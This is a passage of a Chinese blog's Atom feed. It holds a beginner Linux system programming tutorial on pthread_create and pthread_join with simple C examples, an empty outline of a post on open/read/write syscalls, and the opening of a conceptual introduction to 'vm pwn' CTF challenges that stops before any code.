    <title>Linux系统编程1</title>
    <link href="http://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/"/>
    <id>http://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/</id>
    <published>2025-02-23T17:03:25.000Z</published>
    <updated>2025-02-24T12:58:33.869Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>Linux</code>系统编程</li></ul><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><ul><li>使用<code>man</code>命令，可以查看<code>Linux</code>手册，<code>man</code>是<code>manual</code>的命令缩写，其中文意思就是<code>手册</code>的意思。</li><li>我们要查看一个<code>命令</code>或<code>函数</code>的使用方法，我们就可以使用<code>man 命令</code>或<code>man 函数</code></li><li>例如：我们要查看<code>getpid</code>的用法，就可以执行<code>man getpid</code>，就可以查看手册中<code>getpid</code>这个函数的用法</li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224012228588.png" alt="image-20250224012228588"></p><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224012456624.png" alt="image-20250224012456624"></p><ul><li><p>在<code>OS</code>中进程是一个非常重要的概念，之后能让我们更方便理解进程，我们就先介绍另一个命令<code>pstree</code>，这个命令我们用来查看操作系统的进程树。我们可以使用<code>进程树</code>来辅助理解或者调试一些程序。<code>pstree</code>这个命令有一些相关的参数，接下来介绍一些常用的参数。</p><ul><li><code>-p</code>：输出进程树，并且会输出进程号</li><li><code>-a</code>：显示进程树，并且显示每个进程对应的目录文件</li></ul></li><li><p>接下来我们使用<code>pstree -p</code>命令查看一下具体的进程树：</p></li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224013520032.png" alt="image-20250224013520032"></p><h1 id="fork函数"><a href="#fork-函数" class="headerlink" title="fork()函数"></a>fork()函数</h1><ul><li>在理解<code>fork</code>函数之前我们先需要介绍一下进程，在操作系统中我们在运行中的程序就相当于一个<strong>进程</strong>，而每个进程都会有一个进程号（pid），并且进程具有树状关系，一个进程可以创建一个新进程，而这个新进程就相当于是该进程的一个<strong>子进程</strong>。</li><li>在一个进程中，我们可以使用<code>getpid()</code>获取当前进程所对应的进程号，我们还可以使用<code>getppid()</code>获取当前进程所对应父进程的进程号。   </li></ul><h1 id="线程相关"><a href="#线程相关" class="headerlink" title="线程相关"></a>线程相关</h1><h2 id="pthread_create函数"><a href="#pthread-create-函数" class="headerlink" title="pthread_create()函数"></a>pthread_create()函数</h2><ul><li><p>会详细介绍<code>pthread_create</code>函数还会详细介绍<code>pthread_join()</code>函数</p></li><li><p><code>pthread_create()</code>，这个函数是Linux系统提供的一个函数，作用是在当前进程中创建一个线程。接下来说明一下这个函数是如何使用的。</p><ul><li>首先要使用这个函数，首先要包含头文件<code>#include&lt;pthread.h&gt;</code>。</li><li>使用<code>gcc</code>编译链接的时候还需要使用<code>-pthread</code>命令来进行编译。</li><li>这个函数的功能：在我们调用<code>pthread_create()</code>函数的进程中，就会在该进程中调用一个线程。这个线程会开始执行下面<code>pthread_create()</code>函数中第<code>3</code>个参数（即函数指针）指向的函数。</li><li>注意：<strong>被指向的函数也有要求，这个函数参数要求传递<code>void *</code>，返回值也要求是<code>void *</code>，但是这并不意味着这个函数没有传递参数，具体请看下面例子</strong>，即指向<code>void</code>类型的指针。这个指针所指向的函数就是我们线程要执行的内容。</li></ul></li><li>现在说明一下这个函数的<code>参数</code>和<code>返回值</code>：<ul><li><code>pthread_t类型</code>：实际上该类型就是一个<code>无符号整型</code>，只是使用了这个语句进行定义<code>typedef unsigned long int pthread_t;</code></li><li><code>pthread_t *thread</code>：传入的是一个指向<code>线程ID</code>的指针。这也就是说，我们可以自定义<code>线程ID</code>，并不像创建一个子进程，这个进程号是系统给的。</li><li><code>pthread_attr_t *attr</code>：<code>pthread_attr_t</code>是一个结构体，所以<code>*attr</code>是结构体类型的指针，其指向的是<code>pthread_attr_t</code>。这个结构体指针，这个参数就是用来决定新线程的属性。如果该线程没有属性，就使用<code>NULL</code>作为参数。</li><li><code>void *(*start_routine)(void *)</code>：<code>start_routine</code>是一个函数指针，这个指针指向的函数地址就是线程要执行的内容。</li><li><code>void *arg</code>：传递给线程函数的参数，没有任何参数就填<code>NULL</code></li><li>返回值：创建成功就会返回<code>0</code>，创建失败就会返回一个特定的<code>非零值</code>。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span></span><br><span class="line">    <span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr, <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure><h3 id="level_1"><a href="#level-1" class="headerlink" title="level_1"></a>level_1</h3><ul><li>接下来举一个例子：<ul><li>就是创建一个线程，使得线程执行<code>thread_function</code></li><li>但是这个代码的执行结果不符合我们的预期，原因是进程创建完线程就结束了，进程结束会导致线程也被终止，线程是依赖于进程的，其资源属于进程</li><li>所以这时我们需要在创建完线程后，让进程执行<code>while</code>循环，以确保进程不结束，这样就得到了预期结果</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224190908851.png" alt="image-20250224190908851"></p><h3 id="level_2"><a href="#level-2" class="headerlink" title="level_2"></a>level_2</h3><ul><li>但是这个代码还是有问题，因为线程进入死循环了，现在我们继续修改这个代码，使得线程有限次循环。</li><li>但是还会出现问题，这个线程结束后进程还会在等待中，这样程序一直不会结束</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="level_3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h3><ul><li>接下来我们继续改进该程序，使得进程能够接受到线程结束。这个时候需要使用到<code>pthread_join()</code>这个函数。<ul><li>这个函数就是等待我们创建的线程结束。线程结束，这个函数将立刻返回；线程没结束，这个函数将阻塞进程。</li><li>这个函数有两个参数和<code>int</code>类型的返回值<code>int pthread_join(pthread_t thread, void **retval);</code><ul><li><code>pthread_t thread</code>：<code>线程ID</code>，<code>pthread_join</code>要等待什么线程结束</li><li><code>void **retval</code>：<code>结束状态</code>，如果这个指针不是空指针，将保存目标线程的退出状态，如果不想保存就使用<code>NULL</code></li><li><code>返回值</code>：调用成功返回<code>0</code></li></ul></li></ul></li><li>接下来继续优化代码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// gcc 6_thread,c -pthread</span><br><span class="line"><span class="comment">#include&lt;pthread.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">void *thread_function(void *arg);</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void)</span><br><span class="line">&#123;</span><br><span class="line">        pthread_t pthread;</span><br><span class="line">        <span class="built_in">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, NULL, thread_function, NULL);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_join(pthread,NULL);</span><br><span class="line">        printf(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void *thread_function(void *arg)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">int</span> i;</span><br><span class="line">        printf(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224192455330.png" alt="image-20250224192455330"></p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><ul><li><p>接下来我们继续改进该程序，让我们的进程指定线程循环的次数。这时就需要用上<code>pthread_create()</code>函数的最后一个参数<code>* argv</code></p></li><li><p>但是如果我们按照正常指针来使用这个参数，在编译的时候就会发生错误，因为传递的是<code>void</code>类型的指针，这时需要转换为<code>整型</code>类型的指针</p></li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193032681.png" alt="image-20250224193032681"></p><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193053738.png" alt="image-20250224193053738"></p><ul><li>最终代码如下：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">5</span>;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, &amp;count);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pthread_join(pthread,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thre thread is over,process is over too.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; *(<span class="type">int</span> *)arg; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224193322794.png" alt="image-20250224193322794"></p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h2 id="线程之间通信"><a href="#线程之间通信" class="headerlink" title="线程之间通信"></a>线程之间通信</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Linux&lt;/code&gt;系统编程&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;man&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ORW相关系统调用</title>
    <link href="http://iyheart.github.io/2025/02/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/ORW%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>http://iyheart.github.io/2025/02/23/CTFblog/PWN%E7%B3%BB%E5%88%97blog/ORW%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</id>
    <published>2025-02-23T15:19:56.000Z</published>
    <updated>2025-03-26T14:57:53.903Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本篇博客会详细介绍一些<code>ORW</code>系统调用，包括如何使用，相关参数，以及底层原理。</li></ul><h1 id="系统调用详细介绍"><a href="#系统调用详细介绍" class="headerlink" title="系统调用详细介绍"></a>系统调用详细介绍</h1><h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><h1 id="代替open"><a href="#代替open" class="headerlink" title="代替open"></a>代替open</h1><h1 id="代替write"><a href="#代替write" class="headerlink" title="代替write"></a>代替write</h1><h1 id="代替read"><a href="#代替read" class="headerlink" title="代替read"></a>代替read</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;本篇博客会详细介绍一些&lt;code&gt;ORW&lt;/code&gt;系统调用，包括如何使用，相关参数，以及底层原理。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;系统调用详细介绍&quot;&gt;&lt;a href=&quot;#系统调用详细介绍&quot; class=&quot;headerlink&quot; title=&quot;系统调用</summary>
      
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>vm_pwn入门</title>
    <link href="http://iyheart.github.io/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/"/>
    <id>http://iyheart.github.io/2025/02/22/CTFblog/PWN%E7%B3%BB%E5%88%97blog/VM_pwn/vm-pwn%E5%85%A5%E9%97%A8/</id>
    <published>2025-02-22T15:05:07.000Z</published>
    <updated>2025-03-26T14:24:01.868Z</updated>
    
    <content type="html"><![CDATA[<ul><li>打算新生赛出一题<code>vm pwn</code>，不知道来不来得及出。趁着出题给自己也入门一下<code>vm pwn</code></li><li>接下来介绍一下<code>vm pwn</code>，这里需要纠正一个误区，<code>vm pwn</code>不是<code>虚拟机逃逸之类的pwn</code>，<code>虚拟机的pwn</code>可能还距离我有点远。</li></ul><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ul><li><code>vmpwn</code>一般指代在程序中实现运算指令(汇编指令)来模拟程序的运行或者在程序中自定义运算指令的程序(编译类型)，这种类型的难点可能在于<code>逆向</code>。</li><li>对于汇编类题型，一般的题目就像如下这样：<ul><li>解题的关键点就是逆向出<code>伪汇编指令</code>，漏洞一般就是越界读写。</li><li>这种类型题目的程序，一般都会让用户输入<code>OPCODE</code>，之后就会将用户输入的<code>OPCODE</code>转换为一个伪汇编指令，通过这样来模拟程序在底层中的运行模式。</li></ul></li><li>对于<code>vmpwn</code>的题目，并没有出现什么知识点，主要就是逆向；如果硬要掰扯，那么涉及到的可能就是<code>计算机组成原理</code>对指令设计这个理论知识点的实际应用，操作码的话如果是<code>扩展操作码</code>就比较难逆向，而<code>非扩展操作码</code>会更容易逆向。所以我们在做这题的时候就要逆向出一下几点：<ul><li>模拟的寄存器的初始值和功能，比如<code>SP</code>指针，<code>PC</code>指针</li><li>模拟的内存，模拟的栈，模拟的缓冲区</li><li>模拟的指令，例如<code>mov r1,r2,r3</code>，三寄存器运算指令，二寄存器运算指令，一寄存器运算指令，固定操作码，可扩展操作码。</li><li>模拟的指令规划。</li></ul></li></ul><h1 id="vm_pwn_level_1"><a href="#VM-PWN-level-1" class="headerlink" title="VM_PWN_level_1"></a>VM_PWN_level_1</h1><ul><li>这里由于时间原因我就哪<code>level_2</code>的题目做了一个简单的修改，并且调试会变得更简单，所以这里就给出源码。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span 